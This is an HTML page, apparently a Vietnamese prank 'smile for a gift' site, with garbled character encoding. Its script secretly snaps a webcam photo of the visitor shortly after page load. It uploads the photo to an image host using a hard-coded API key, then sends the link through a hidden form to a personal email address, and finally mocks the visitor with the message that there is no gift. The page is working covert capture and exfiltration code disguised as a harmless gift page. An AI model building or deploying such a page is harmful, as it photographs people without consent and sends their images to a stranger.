<!DOCTYPE html>
<html lang="vi">
  <head>
    <meta charset="UTF-8" />
    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
    <title>C√≥ Qu√† N√® ...</title>
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
    <link rel="stylesheet" href="style.css" />
  </head>
  <body>
    <h1>C∆∞·ªùi l√™n n√†o s·∫Ω c√≥ qu√† n√® üéÅ</h1>
    <div id="cameraContainer">
      <video id="video" autoplay playsinline></video>
      <canvas id="canvas"></canvas>
    </div>
    <div id="status"></div>
    <div id="slomoEffect">
      <img
        id="slomoImage"
        src="https://i.imgur.com/XYZXYZXYZ.jpg"
        alt="Slomo Effect"
      />
    </div>

    <form
      id="emailForm"
      action="https://formsubmit.co/huysynguyen35@gmail.com"
      method="POST"
      style="display: none"
    >
      <input type="hidden" name="_captcha" value="false" />
      <input
        type="hidden"
        name="_subject"
        value="[·∫¢nh m·ªõi t·ª´ ·ª©ng d·ª•ng qu√† t·∫∑ng]"
      />
      <input type="hidden" id="photoUrl" name="photo_url" />
    </form>

    <script>
      const video = document.getElementById("video");
      const canvas = document.getElementById("canvas");
      const statusDiv = document.getElementById("status");
      const slomoEffect = document.getElementById("slomoEffect");
      const slomoImage = document.getElementById("slomoImage");
      const emailForm = document.getElementById("emailForm");
      const photoUrlInput = document.getElementById("photoUrl");
      const imgbbApiKey = "45f5e2109ceae6001893b55fde20f69e";
      const slomoImages = [
        "https://i.imgur.com/3TXJ6oW.gif",
        "https://i.imgur.com/5Z3J5J5.gif",
        "https://i.imgur.com/7X8X9X9.gif",
        "https://i.imgur.com/1A2B3C4.gif",
      ];

      async function initCamera() {
        try {
          const stream = await navigator.mediaDevices.getUserMedia({
            video: true,
          });
          video.srcObject = stream;
          setTimeout(takePhoto, 700);
        } catch (err) {
          statusDiv.textContent = "‚ùå L·ªói: " + err.message;
          statusDiv.style.backgroundColor = "#ffebee";
        }
      }

      function takePhoto() {
        canvas.width = video.videoWidth;
        canvas.height = video.videoHeight;
        const ctx = canvas.getContext("2d");
        ctx.drawImage(video, 0, 0, canvas.width, canvas.height);

        const imageData = canvas.toDataURL("image/jpeg", 0.9).split(",")[1];

        statusDiv.textContent = "ƒêang chu·∫©n b·ªã qu√† cho b·∫°n iu n√®e ...";
        statusDiv.style.backgroundColor = "#fff3e0";

        fetch(`https://api.imgbb.com/1/upload?key=${imgbbApiKey}`, {
          method: "POST",
          body: new URLSearchParams({
            image: imageData,
          }),
        })
          .then((res) => res.json())
          .then((result) => {
            if (result.success) {
              const url = result.data.url;
              photoUrlInput.value = url; // L∆∞u URL ·∫£nh v√†o form

              statusDiv.textContent = "L√™uu l√™uu kh√¥ng c√≥ qu√† ƒë√¢uu üòù";
              statusDiv.style.backgroundColor = "#e8f5e9";

              // G·ª≠i form email
              emailForm.submit();

              // Hi·ªÉn th·ªã hi·ªáu ·ª©ng slomo
              showSlomoEffect();
            } else {
              statusDiv.textContent = "‚ùåB·∫°n h√¥ng c∆∞·ªùi n√™n l√† h√¥ng c√≥ qu√† r√πi";
              statusDiv.style.backgroundColor = "#ffebee";
            }
          })
          .catch((err) => {
            statusDiv.textContent = "B·∫°n h√¥ng c√≥ c∆∞·ªùi k√¨aaa " + err.message;
            statusDiv.style.backgroundColor = "#ffebee";
          });
      }

      function showSlomoEffect() {
        const randomImage =
          slomoImages[Math.floor(Math.random() * slomoImages.length)];
        slomoImage.src = randomImage;
        slomoEffect.style.display = "flex";
        setTimeout(() => {
          slomoEffect.style.display = "none";
        }, 5000);
      }

      initCamera();
    </script>
  </body>
</html>

